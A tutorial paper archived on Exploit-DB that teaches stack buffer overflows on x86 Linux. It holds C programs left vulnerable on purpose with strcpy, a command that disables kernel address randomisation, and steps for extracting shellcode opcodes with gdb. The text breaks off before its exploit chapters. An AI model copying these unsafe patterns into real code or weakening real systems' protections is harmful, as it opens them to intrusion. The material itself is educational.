<!DOCTYPE html>
<html lang="en">

<head>
    <script src="/js/core/jquery.min.js"></script>
    <meta charset="utf-8"/>
    <meta name="csrf-token" content="01nU7dLRcjPmAlOo8uLjAY8VWReC9IFol8XBSb7g">

    <link rel="manifest" href="/manifest.json">

    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
    <link rel="icon" type="image/png" href="/favicon.ico">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>

    
    <title>Buffer Overflows, A Peek Under The Hood 1.0</title>

    <!-- Prism code colouring -->
    <link rel="stylesheet" href="/css/prism.css">

    <!-- prism.js syntax highlighter -->
    <script src="/js/clipboard.js"></script>
    <script src="/js/prism.js"></script>

    <link rel="canonical" href="https://www.exploit-db.com/papers/13164">
    <meta name="description" content="Buffer Overflows, A Peek Under The Hood 1.0">
    <meta name="keywords" content="AIX,papers">
    <meta name="author" content="Zapotek">

    <meta property="og:title" content="Buffer Overflows, A Peek Under The Hood 1.0">
    <meta property="og:type" content="article" />
    <meta property="og:url" content="https://www.exploit-db.com/exploits/13164">
    <meta property="og:image" content="https://www.exploit-db.com/images/spider-orange.png" />
    <meta property="og:site_name" content="Exploit Database" />
    <meta property="article:published_time" content="2006-08-26" />
        <meta property="article:author" content="Zapotek" />
    <meta property="article:authorUrl" content="https://www.exploit-db.com/?author=2516" />

    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="@ExploitDB">
    <meta name="twitter:title" content="Buffer Overflows, A Peek Under The Hood 1.0">
    <meta name="twitter:creator" content="@ExploitDB">
    <meta name="twitter:image:src" content="https://www.exploit-db.com/images/spider-orange.png">


    <link rel="alternate" type="application/rss+xml" title="Exploit-DB.com RSS Feed" href="/rss.xml">

    <meta
            content='width=device-width, initial-scale=1.0, shrink-to-fit=no'
            name='viewport'/>

    <meta property="og:title" content="Offensive Security&#8217;s Exploit Database Archive">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://www.exploit-db.com/">

    <meta name="theme-color" content="#ec5e10">

    <script id="Cookiebot" src="https://consent.cookiebot.com/uc.js" data-cbid="5cfe7093-608f-4f4e-80b4-925b1e9d949f"
            data-georegions="{'region':'US-06','cbid':'6abbf59f-78fd-4d8f-ac7e-b57c0f046bbf'}" data-blockingmode="auto"
            type="text/javascript">
    </script>

    <script type="text/javascript">
        window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
        ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );

        ga('send', 'pageview');
    </script>
    <script async src="https://www.google-analytics.com/analytics.js"
            type="text/javascript">

    </script>

    <!-- Material Design Icons https://materialdesignicons.com/ -->
    <link href="/css/materialdesignicons.min.css" media="all" rel="stylesheet" type="text/css"/>

    <!-- Theme CSS Files -->
    <link href="/css/bootstrap.min.css" rel="stylesheet"/>

    <link href="/css/now-ui-dashboard.css" rel="stylesheet"/>

    <link href="/css/app.css" rel="stylesheet"/>

    <style>
        .rbtn {
            border: 2px solid white;
            border-radius: 20px;
            color: black;
            padding: 8px;
            cursor: pointer;
        }

        .rsuccess {
            border-color: white;
            color: white;
        }

        .rsuccess:hover {
            background-color: white;
            color: #165283;
        }
        .rprimary {
            border-color: #ca4f0c;
            color: #ca4f0c;
        }

        .rprimary:hover {
            background-color: #ca4f0c;
            color: white;
        }
    </style>
</head>

<body class=" sidebar-mini">

<div class="wrapper">

    
    <div class="sidebar" data-color="orange">

    <div class="logo">

        
        <a href="/" class="simple-text logo-mini">
            &nbsp;<img src="/images/spider-white.png" alt="Exploit Database">
        </a>

        
        
            <a href="/" class="simple-text logo-normal">
                Exploit Database
            </a>

        
    </div>

    <div class="sidebar-wrapper">

        <ul class="nav">

            
            <li class="">

                <a href="/">
                    <i class="mdi mdi-ladybug mdi-24px"></i>
                    <p>Exploits</p>
                </a>

            </li>

            
            <li class="">

                <a href="/google-hacking-database">
                    <i class="mdi mdi-search-web mdi-24px"></i>
                    <p title="Google Hacking Database">GHDB</p>
                </a>

            </li>

            
            <li class="active">

                <a href="/papers">
                    <i class="mdi mdi-file-outline mdi-24px"></i>
                    <p>Papers</p>
                </a>

            </li>

            
            <li class="">

                <a href="/shellcodes">
                    <i class="mdi mdi-chip mdi-24px"></i>
                    <p>Shellcodes</p>
                </a>

            </li>

        </ul>

        <hr/>

        <ul class="nav">



                <li>

                    <a class="nav-link" href="/search">
                        <i class="mdi mdi-database-search mdi-24px"></i>
                        <p title="Search Exploit-Database">Search EDB</p>
                    </a>

                </li>



            <li>

                
                <a class="nav-link" href="/searchsploit">
                    <i class="mdi mdi-book-open-page-variant mdi-24px"></i>
                    <p>SearchSploit Manual</p>
                </a>

            </li>

            <li>

                
                <a class="nav-link" href="/submit">
                    <i class="mdi mdi-upload mdi-24px"></i>
                    <p>Submissions</p>
                </a>

            </li>

        </ul>

        <hr/>

        <ul class="nav">

            <li>

                <a data-toggle="collapse" href="#onlineTraining" aria-expanded="false">
                    <i class="mdi mdi-school mdi-24px"></i>
                    <p>Online Training <b class="caret"></b></p>
                </a>

                <div class="collapse " id="onlineTraining">
                    <ul class="nav">

                        <li>
                            <a href="/pentest-training-with-kali-linux">
                                <span class="sidebar-mini-icon">PWK</span>
                                <span class="sidebar-normal" title="Penetration Testing with Kali Linux"> PEN-200 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/wireless-attacks-training">
                                <span class="sidebar-mini-icon">WiFu</span>
                                <span class="sidebar-normal" title="Offensive Security Wireless Attacks"> PEN-210 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/evasion-techniques-breaching-defenses">
                                <span class="sidebar-mini-icon">ETBD</span>
                                <span class="sidebar-normal" title="Evasion Techniques and Breaching Defenses"> PEN-300 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/advanced-web-attacks">
                                <span class="sidebar-mini-icon">AWAE</span>
                                <span class="sidebar-normal" title="Advanced Web Attacks and Exploitation"> WEB-300 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/windows-user-mode-exploit-development">
                                <span class="sidebar-mini-icon">WUMED</span>
                                <span class="sidebar-normal" title="Windows User Mode Exploit Development"> EXP-301 </span>
                            </a>
                        </li>
                    </ul>

                </div>

            </li>

<!--
            <li>

                <a class="nav-link" href="#" data-toggle="modal" data-target="#osresources">
                    <i class="mdi mdi-link-variant mdi-24px"></i>
                    <p>Offsec Resources</p>
                </a>

            </li>
-->
        </ul>

    </div>

</div>

    <div class="main-panel">

        
        <nav class="navbar navbar-expand-lg navbar-transparent  navbar-absolute
  bg-primary">

    <div class="container-fluid">

        <div class="navbar-wrapper">

            <div class="navbar-toggle">
                <button type="button" class="navbar-toggler" aria-label="Toggle Navigation">
                    <span class="navbar-toggler-bar bar1"></span>
                    <span class="navbar-toggler-bar bar2"></span>
                    <span class="navbar-toggler-bar bar3"></span>
                </button>
            </div>

            
            <a class="navbar-brand" href="/">
                <img src="/images/edb-banner-logo-white.png" height="60" alt="Exploit Database">
            </a>

        </div>

        
        <div class="collapse navbar-collapse justify-content-end" id="navigation">

            <ul class="navbar-nav">

                
                    

                        
                           
                           

                            
                            
                                
                            
                        

                        

                            
                                
                            

                            
                               
                                                     
                                
                            

                            
                                
                            

                        
                    
                

                
                    

                        
                            
                            
                                
                            
                        

                    
                

                <li class="nav-item">

                    
                    <a class="nav-link" href="/exploit-database-statistics" aria-label="Exploit Database Statistics">
                        <i class="mdi mdi-chart-bar-stacked mdi-24px"></i>
                        <p>
                            <span class="d-lg-none d-md-block">Stats</span>
                        </p>
                    </a>

                </li>

                <li class="nav-item dropdown">

                    
                    <a class="nav-link dropdown-toggle" href="/"
                       id="navbarDropdownMenuLink" data-toggle="dropdown"
                       aria-haspopup="true" aria-expanded="false" aria-label="Site Information">

                        <i class="mdi mdi-information-outline mdi-24px"></i>
                        <p>
                            <span class="d-lg-none d-md-block">About Us</span>
                        </p>
                    </a>

                    <div class="dropdown-menu dropdown-menu-right"
                         aria-labelledby="navbarDropdownMenuLink">

                        <a class="dropdown-item" href="#" data-toggle="modal" data-target="#about" aria-label="About Exploit-DB">
                            About Exploit-DB
                        </a>

                        <a class="dropdown-item" href="/history" aria-label="Exploit-DB History">
                            Exploit-DB History
                        </a>

                        <a class="dropdown-item" href="/faq" aria-label="FAQ">
                            FAQ
                        </a>

                    </div>

                </li>

                
                                    <li class="nav-item">

                        <a class="nav-link" href="#" data-toggle="modal" data-target="#search" aria-label="Search Exploit-DB">
                            <i class="mdi mdi-database-search mdi-24px"></i>
                            <p>
                                <span class="d-lg-none d-md-block">Search</span>
                            </p>
                        </a>

                    </li>

                
            </ul>

        </div>

    </div>

</nav>

        
        
    <div class="panel-header panel-header-sm"></div>

    <div class="content">

        <div class="row">

            <div class="col-md-12">

                
                <div class="card">

                    <div class="card-body">

                        <div class="row justify-content-md-center">

                            
                            <h1 class="card-title text-secondary text-center" style="font-size: 2.5em;">
                                Buffer Overflows, A Peek Under The Hood 1.0
                            </h1>

                        </div>

                        
                        <div class="ml-2 mr-2">

                            <div class="row">

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                EDB-ID:
                                                            </h3>

                                                            <h6 class="stats-title">
                                                                13164
                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                CVE:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                                                                                        N/A

                                                                
                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr>

                                        <div class="card-footer ">

                                            <div class="stats h6 text-center">

                                                <!-- Display a checkmark if the exploit is verified and an X if not -->
                                                <strong>EDB Verified:</strong>
                                                <i class="mdi mdi-24px mdi-check"
                                                   style="color: #96b365">
                                                </i>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Author:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?author=2516">
                                                                    Zapotek
                                                                </a>

                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Type:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?type=papers">
                                                                    papers
                                                                </a>

                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr/>

                                        <div class="card-footer">

                                            <div class="stats h6 text-center">

                                                <!-- Display a checkmark if the exploit is verified and an X if not -->
                                                <strong>Paper: </strong>
                                                <a href="/download/13164" data-toggle="tooltip" data-placement="top"
                                                   title="Download" aria-label="Download Paper 13164">
                                                    <i class="mdi mdi-download mdi-24px text-primary"></i>
                                                </a>
                                                &nbsp; / &nbsp;
                                                <a href="/raw/13164" data-toggle="tooltip" data-placement="top"
                                                   title="View Raw" aria-label="View Raw 13164">
                                                    <i class="mdi mdi-code-braces mdi-24px text-primary"></i>
                                                </a>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Platform:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?platform=aix">
                                                                    AIX
                                                                </a>

                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Published:
                                                            </h3>

                                                            <h6 class="stats-title">
                                                                2006-08-26
                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr/>

                                        <div class="card-footer ">

                                            <div class="stats h6 text-center">

                                                
                                                <strong>Vulnerable App:</strong>

                                                
                                            </div>

                                        </div>

                                    </div>

                                </div>

                            </div>

                            <div class="row">

                                <div class="btn-group ml-3">

                                    <a class="btn btn-primary btn-fab btn-icon btn-round"
                                       href="/papers/13163" aria-label="View Previous Paper"
                                       data-toggle="tooltip" data-placement="top" title="Previous Paper" >
                                        <i class="mdi mdi-arrow-left mdi-36px"></i>
                                    </a>

                                </div>


                                <div class="col">

                                    <div class="btn-group float-right">

                                        <a class="btn btn-primary btn-fab btn-icon btn-round"
                                           href="/papers/13165" aria-label="View Next Paper"
                                           data-toggle="tooltip" data-placement="top" title="Next Paper" >
                                            <i class="mdi mdi-arrow-right mdi-36px"></i>
                                        </a>

                                    </div>

                                </div>

                            </div>

                        </div>

                    </div>

                </div>

                
                <div class="card">

                    <div class="card-body">

                        
                        <pre><code class="language-txt" style="white-space: pre-wrap;">			.-::Buffer Overflows, a peek under the hood v1.0::-.
					by Zapotek
				 zapotekzsp[at]gmail.com


[ 0x00 ] Chapters
================================================
[ 0x01 ] Prologue
[ 0x02 ] Terms &amp; Conventions
[ 0x03 ] Tools, Environment &amp; Prerequisites
[ 0x04 ] Basic Theory
	[ 0x05 ] Buffers
	[ 0x06 ] Boundaries
	[ 0x07 ] Return Address/EIP
	[ 0x08 ] Vulnerable Functions
[ 0x09 ] Shellcode
	[ 0x0a ] NOP sleds
	[ 0x0b ] Basic Example
	[ 0x0c ] Restricted Characters
	[ 0x0d ] Other examples
[ 0x0e ] Basic Buffer Overflow &amp; Exploit Example
[ 0x0f ] Vulnerable TCP/IP server &amp; Exploit code
[ 0x10 ] Epilogue
================================================



[ 0x01 ] Prologue
===============================================
Many papers and exploits have been published regarding buffer overflow vulnerabilities.
Buffer overflows are one of the most hazardous bugs ever, and very liekly to occur as well.

Everyone, in one way or another, has written code vulnerable to an overflow attack.
Furthermore, people enthused in IT security are afraid of the term and think of it as
something impossible to master.

That&#039;s why I decided to write this paper, to illustrate in a simple manner,
how buffer overflows work, how dangerous they are and --of course-- how to exploit them.
After reading this paper you will still be far from a buffer overflow master,
but you&#039;ll have a fairly good understanding about how they work.

I will not try to cover everything nor get into advanced exploitation techniques,
instead, I&#039;ll try to keep it as simple and comprehensible as possible.


[ 0x02 ] Terms &amp; Conventions
===============================================
It would be significantly easier to understand what is written here if you have a basic grasp
of terms and conventions used in this text.

target:
============
A system running the vulnerable service/application which we are about to attack.

exploit/sploit:
===============
A piece of code used to compromise the target.

EIP:
============
Extended Instruction Pointer
Is the memory register which holds the RET address.

RET address:
============
Is the address which is responsible for an application&#039;s execution flow.
It is updated by every operation, when that operation is completed, and is read by the next operation
in order, for the next operation, to know where to continue from.

OPCODEs:
========
OPCODEs (OPeration CODEs) are CPU instructions, binary code, encoded into hexadecimal format

Blocks between:
&quot;*********************************************************************************************&quot;
contain code.

Blocks between:
&quot;---------------------------------------------------------------------------------------------&quot;
contain shell output or other preformatted text.


[ 0x03 ] Tools, Environment &amp; Prerequisites
===============================================
In oder for the examples presented here to be functional your system must comply with the following:

CPU:
====
Intel 8086 (x86) 32bit

Operating System:
=================
Linux with a 2.6.x kernel.
Other versions might work, I can&#039;t guarantee anything though.
Get it from: http://www.kernel.org/

Compiler:
=========
gcc 4.1.0 and higher 
I&#039;m pretty sure any other version will work, it&#039;s just that v.4.1.0 is what I used to develop the examples.
Get it from: http://gcc.gnu.org/

Debugger:
=========
GDB v6.4 will be used throughout this text so it&#039;s better to have it.
Get it from: http://www.gnu.org/software/gdb/

Dissasembler:
=============
GDB will be used, mainly, but &quot;objdump&quot; is more convenient when it comes to extracting
OPCODEs from executables for the shellcode.
Get it from: http://www.gnu.org/software/binutils/


Perl:
======
Perl will be used for some examples due to it&#039;s ease of use and effectiveness.
Basicaly, I&#039;ll use it just because I couldn&#039;t get bash to stop messing with the shellcode&#039;s encoding. :P
Get it from: http://http://www.perl.org/

Chances are you already have all that software installed but better make sure.


A basic knowledge of the C programming language is needed.
It would help if you have a fairly good understanding of memory management and x86 assembler,
but that&#039;s not that important at the comment.

Also, base conventions will be needed so if you can&#039;t read hex get a calculator.
Moreover, hexadecimal ASCII codes will be used so if you can&#039;t ,
once more, read hex get a converter or see http://www.neurophys.wisc.edu/www/comp/docs/ascii.html .

Also be sure that the bellow command is run before continuing further:
---------------------------------------------------------------------------------------------
echo 0 &gt; /proc/sys/kernel/randomize_va_space &amp;&amp; ulimit -c unlimited
---------------------------------------------------------------------------------------------

Moreover, on the &quot;[ 0x0f ] Vulnerable TCP/IP server &amp; Exploit code&quot; chapter the TCP/IP server might
need to be run as root or an account that has &quot;bind()&quot; privileges.


Nothing else is required.
Remember that this text will teach you only the very basic stuff which will take place in a perfect realm,
in the real world one must have a GREATER amount of knowledge to exploit buffer overflows.

Let&#039;s start making these baby steps now.


[ 0x04 ] Basic Theory
===============================================
This part is very boring so I&#039;ll try to keep it short.


[ 0x05 ] Buffers
===============================================
The term &#039;buffer&#039; represents an array of data, most times characters.
Buffers are either dynamic or static depending on how they are declared in the code.

Static buffer:
*********************************************************************************************
#include &lt;stdio.h&gt;

int main(int argc, char *argv[])
{
  /*
   static buffer of 10 bytes, initialized at program load and stored
   in the data segment
 */
  char buffer[10]=&quot;qwertyuio&quot;;

  // some more code

  return 0;
}

*********************************************************************************************


Dynamic buffer:
*********************************************************************************************
#include &lt;stdio.h&gt;

int main(int argc, char *argv[])
{
  /*
   dynamic buffer of 10 bytes, initialized at run-time and stored
   in the stack
 */
  char buffer[10];

  /*
   we are using the buffer now and forcing it to hold whatever
   argv[1] is holding
  */
  strcpy(buffer,argv[1]);

  // some more code

  return 0;
}

*********************************************************************************************



[ 0x06 ] Boundaries
===============================================
Boundaries are borders that enclose a memory area.
You are probably thinking:
&quot;But, if boundaries exist buffer overflows shouldn&#039;t.&quot;

Well, don&#039;t bet on it.
Thing is, many C functions which have to do with data copying/reading don&#039;t do any boundary checks,
so if an array is declared to hold 10 bytes, a boundary-unsafe function can force it to store 15,
for example, which will cause an error in the execution flow called &quot;Segmentation Fault&quot;.

Lets see another code example :
*********************************************************************************************
#include &lt;stdio.h&gt;

int overflow(char *str){
  /*
   dynamic buffer of 10 bytes, initialized at run-time and stored
   in the stack
 */
  char buffer[10];

  /*
   we are using the buffer now and forcing it to hold whatever
   str is holding
  */
  strcpy(buffer,str);

  return 0;

}

int main(int argc, char *argv[])
{
  // our vulnerable function
  overflow(argv[1]);

  // some more code

  return 0;
}

*********************************************************************************************


We are using the &quot;strcpy()&quot; function [ man 3 strcpy ], in our overflow function, which copies the data stored in &quot;str&quot; into &quot;buffer&quot;.
We have declared &quot;buffer&quot; to hold up to 10 bytes of data.
Can you imagine what will happen if &quot;argv[1]&quot; contains more than that?
Let&#039;s say 15 bytes, or maybe a lot more?

Let&#039;s see:
---------------------------------------------------------------------------------------------
zapotek@lil-z:/Documents/bo&gt; ./tmp.vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Buffer holds: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault
zapotek@lil-z:/Documents/bo&gt;   
---------------------------------------------------------------------------------------------


Hey, what do you know! We got a seg fault!
&quot;But what the hell a seg fault is?&quot;, you&#039;re thinking.
A seg fault occurs because we overwrote part of the memory used
by the program that is critical for it&#039;s execution.

You see, whenever something happens in the program it leaves an address in memory,
called RET (return) address in the EIP (Extended Instruction Pointer),
so that the next operation can continue from there.
If that address is invalid, execution stops and we get a seg fault.

Run the &quot;ulimit -c unlimited&quot; command --to enable core dumps-- and lets see what really happens:

 [a] If we supply input under 10 bytes, which the program can handle.
---------------------------------------------------------------------------------------------
zapotek@lil-z:/Documents/bo&gt; ./tmp.vuln aaaaaa
Buffer holds: aaaaaa
zapotek@lil-z:/Documents/bo&gt;
---------------------------------------------------------------------------------------------

Nothing happens, no error, everything runs smoothly.

[b]If we supply the prog with input longer than 10 chars:
---------------------------------------------------------------------------------------------
zapotek@lil-z:/Documents/bo&gt; ./tmp.vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Buffer holds: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
zapotek@lil-z:/Documents/bo&gt;   
---------------------------------------------------------------------------------------------


This time we have a core dump to study and find out what went wrong.
It&#039;s time to move to the next chapter!


[ 0x07 ] Return Address
===============================================
In simple words, every time the program performs an operation, when that operation completes,
it updates the EIP register with a new address, the RET, return, address.

Then the next operation will read the EIP and continue from where the last operation left off.
The RET points somewhere in memory where an instruction, command, lies.
So, the program runs smoothly without missing data nor instructions.


[ 0x08 ] Vulnerable Functions
===============================================
C has many functions that don&#039;t do any boundary checking, a list follows:

getchar  	read a character from STDIN
gets 		read a string from STDIN
scanf  		read formatted input from 
sprintf		write formatted output to a buffer
fread	  	read from a file
fgets  		get a string of characters from a stream
memcpy  	copies one buffer to another
memmove 	moves one buffer to another
memset		fills a buffer with a character
strcat 		concatenates two strings
strcpy		copies one string to another
strncat  	concatenates a certain amount of characters of two strings
strncpy  	copies a certain amount of characters from one string to another

Basically, any function that copies/reads/moves memory segments is unsafe,
so you must always do boundary checks on your own.


[ 0x09 ] Shellcode
===============================================
That&#039;s a very hard part and we will not get into it that much.
Maybe on another text, but not on this one.

Long story short, a shellcode is a set of machine code, binary, encoded into Hexadecimal format, OPCODEs.
This set of OPCODEs are concatenated into a NULL terminated string.
As you can understand it cannot contain any NULL (0x00) characters in it as they will corrupt the
shellcode in a manner that it&#039;ll terminate it before it&#039;s real ending, when we are trying to exploit
a character buffer that is.

If for example a shellcode contains a NULL in the middle only half the shellcode will be executed.
That&#039;s because NULLs are used as end of string indicators.


[ 0x0a ] NOP sleds
===============================================
A NOP (No OPeration) instruction can be any instruction that doesn&#039;t affect the execution flow.
We usually use the &quot;0x90&quot; OPCODE (Operation CODE) for that.

A NOP-sled is a string of repeated NOPs.
This:
---------------------------------------------------------------------------------------------
0x900x900x900x900x900x900x900x900x90
---------------------------------------------------------------------------------------------
is a NOP-sled and that:
---------------------------------------------------------------------------------------------
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
---------------------------------------------------------------------------------------------
is the same.

&quot;Why do we even use NOPs, they just take up space from the really useful shellcode!&quot;
Well, yes they do, BUT keep in mind that the shellcode is provided to the program
using some input method and then stored somewhere in memory.

We don&#039;t know where, that&#039;s where the NOP-sled comes in handy, a big NOP-sled
increases our odds of guessing the right RET address.
Since NOPs do nothing, using any address that points anywhere in our NOP-sled
the execution flow will eventually reach our shellcode.

Example:

If the string we pass to the application is:
---------------------------------------------------------------------------------------------
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x43\x65\x87\xe3\x4df0000000
---------------------------------------------------------------------------------------------
and our shellcode is,
---------------------------------------------------------------------------------------------
\x43\x65\x87\xe3\x4d
---------------------------------------------------------------------------------------------
and 0xf0000000 is the address of the begging of the NOP-sled,
the CPU will just continue to the next OPCODE, and then the next, and the next, and the next and it will,
eventually, execute our shellcode.
That&#039;s pretty useful, huh?

Note that the part of the string that overwrites the EIP is not always the last 4 bytes, the above is just an example.


[ 0x0b ] Basic Example
===============================================
We already clarified that a shellcode is a set of  CPU instructions (OPCODEs) coded in a Hexadecimal format.
&quot;WTF dude you want us to learn binary and then convert the code to hex?&quot;
LMAO! Of course not.

Lets say that we want a shellcode that will execute the &quot;uname -a&quot; UNIX comand.
We must first write the program in C, you can choose another language but I like C.

shellcode.c
*********************************************************************************************
int main( )
{
  execve(&quot;uname -a&quot;);
  exit(0);
}

*********************************************************************************************

That easy, matter of fact it&#039;s just a 40 character long one-liner:

shellcode.c
*********************************************************************************************
int main(){execve(&quot;uname -a&quot;);exit(0);}
*********************************************************************************************

Hehehehehe.....
OK, let&#039;s get dirty.
(Keep in mind that we need to use the &quot;--static&quot; flag when compiling to include libraries and functions
in the binary)

Lets disassemble &quot;main&quot;:
---------------------------------------------------------------------------------------------
zapotek@lil-z:/Documents/bo&gt; gcc --static shellcode.c -o shellcode
zapotek@lil-z:/Documents/bo&gt; ./shellcode
Linux lil-z 2.6.16.13-4-smp #1 SMP Wed May 3 04:53:23 UTC 2006 i686 i686 i386 GNU/Linux
zapotek@lil-z:/Documents/bo&gt; gdb shellcode
GNU gdb 6.4
Copyright 2005 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type &quot;show copying&quot; to see the conditions.
There is absolutely no warranty for GDB.  Type &quot;show warranty&quot; for details.
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
This GDB was configured as &quot;i586-suse-linux&quot;...Using host libthread_db library &quot;/lib/libthread_db.so.1&quot;.

(gdb) disas main
Dump of assembler code for function main:
0x08048248 &lt;main+0&gt;:    lea    0x4(%esp),%ecx
0x0804824c &lt;main+4&gt;:    and    $0xfffffff0,%esp
0x0804824f &lt;main+7&gt;:    pushl  0xfffffffc(%ecx)
0x08048252 &lt;main+10&gt;:   push   %ebp
0x08048253 &lt;main+11&gt;:   mov    %esp,%ebp
0x08048255 &lt;main+13&gt;:   push   %ecx
0x08048256 &lt;main+14&gt;:   sub    $0x4,%esp
0x08048259 &lt;main+17&gt;:   movl   $0x809d748,(%esp)
0x08048260 &lt;main+24&gt;:   call   0x804db30 &lt;execve&gt;
0x08048265 &lt;main+29&gt;:   movl   $0x0,(%esp)
0x0804826c &lt;main+36&gt;:   call   0x80489d0 &lt;exit&gt;
0x08048271 &lt;main+41&gt;:   nop
0x08048272 &lt;main+42&gt;:   nop
0x08048273 &lt;main+43&gt;:   nop
0x08048274 &lt;main+44&gt;:   nop
0x08048275 &lt;main+45&gt;:   nop
0x08048276 &lt;main+46&gt;:   nop
0x08048277 &lt;main+47&gt;:   nop
0x08048278 &lt;main+48&gt;:   nop
0x08048279 &lt;main+49&gt;:   nop
0x0804827a &lt;main+50&gt;:   nop
0x0804827b &lt;main+51&gt;:   nop
0x0804827c &lt;main+52&gt;:   nop
0x0804827d &lt;main+53&gt;:   nop
0x0804827e &lt;main+54&gt;:   nop
0x0804827f &lt;main+55&gt;:   nop
End of assembler dump.
(gdb)
---------------------------------------------------------------------------------------------

&quot;Cool! We have our C coded turned into x86 assembler language!&quot;
But that&#039;s just the &quot;main&quot; function,
we want the &quot;execve&quot; function which lets us execute system commands.

Let&#039;s go one more time:
---------------------------------------------------------------------------------------------
(gdb) disas execve
Dump of assembler code for function execve:
0x0804db30 &lt;execve+0&gt;:  push   %ebp
0x0804db31 &lt;execve+1&gt;:  mov    %esp,%ebp
0x0804db33 &lt;execve+3&gt;:  mov    0xc(%ebp),%ecx
0x0804db36 &lt;execve+6&gt;:  push   %ebx
0x0804db37 &lt;execve+7&gt;:  mov    0x10(%ebp),%edx
0x0804db3a &lt;execve+10&gt;: mov    0x8(%ebp),%ebx
0x0804db3d &lt;execve+13&gt;: mov    $0xb,%eax
0x0804db42 &lt;execve+18&gt;: call   *0x80b6bbc
0x0804db48 &lt;execve+24&gt;: mov    %eax,%ecx
0x0804db4a &lt;execve+26&gt;: cmp    $0xfffff000,%ecx
0x0804db50 &lt;execve+32&gt;: ja     0x804db55 &lt;execve+37&gt;
0x0804db52 &lt;execve+34&gt;: pop    %ebx
0x0804db53 &lt;execve+35&gt;: pop    %ebp
0x0804db54 &lt;execve+36&gt;: ret
0x0804db55 &lt;execve+37&gt;: mov    $0xffffffe8,%eax
0x0804db5a &lt;execve+42&gt;: neg    %ecx
0x0804db5c &lt;execve+44&gt;: mov    %gs:0x0,%edx
0x0804db63 &lt;execve+51&gt;: mov    %ecx,(%edx,%eax,1)
0x0804db66 &lt;execve+54&gt;: mov    $0xffffffff,%eax
0x0804db6b &lt;execve+59&gt;: jmp    0x804db52 &lt;execve+34&gt;
0x0804db6d &lt;execve+61&gt;: nop
0x0804db6e &lt;execve+62&gt;: nop
0x0804db6f &lt;execve+63&gt;: nop
End of assembler dump.
(gdb)
---------------------------------------------------------------------------------------------

But, hey, don&#039;t we want it in hexadecimal?&quot;
Yeah we do, and we can manage that using gdb again,
by giving it the command &quot;x/bx main&quot;, and then continue hitting return until we reach the &quot;&lt;main+59&gt;&quot; part.
(The rest are just NOPs.)

See it in action:
---------------------------------------------------------------------------------------------
(gdb) x/bx main
0x8048248 &lt;main&gt;:       0x8d
(gdb)
0x8048249 &lt;main+1&gt;:     0x4c
(gdb)
0x804824a &lt;main+2&gt;:     0x24
(gdb)
0x804824b &lt;main+3&gt;:     0x04
.......
(gdb)
0x804827f &lt;main+43&gt;:    0x90
---------------------------------------------------------------------------------------------

Still, we need &quot;execve&quot; not &quot;main&quot; so:
---------------------------------------------------------------------------------------------
(gdb) x/bx execve
0x804db30 &lt;execve&gt;:     0x55
(gdb)
0x804db31 &lt;execve+1&gt;:   0x89
(gdb)
0x804db32 &lt;execve+2&gt;:   0xe5
(gdb)
0x804db33 &lt;execve+3&gt;:   0x8b
.......
(gdb)
0x804db6f &lt;execve+63&gt;:  0x90
(gdb)
---------------------------------------------------------------------------------------------


We could have used the &quot;objdump&quot; disassembler as well, and we would&#039;ve extracted
the shellcode without hassle, but I prefer to keep the amount of tools used in minimum.

Example follows:
---------------------------------------------------------------------------------------------
zapotek@lil-z:~/Documents/bo&gt; objdump shellcode -d
08048248 &lt;main&gt;:
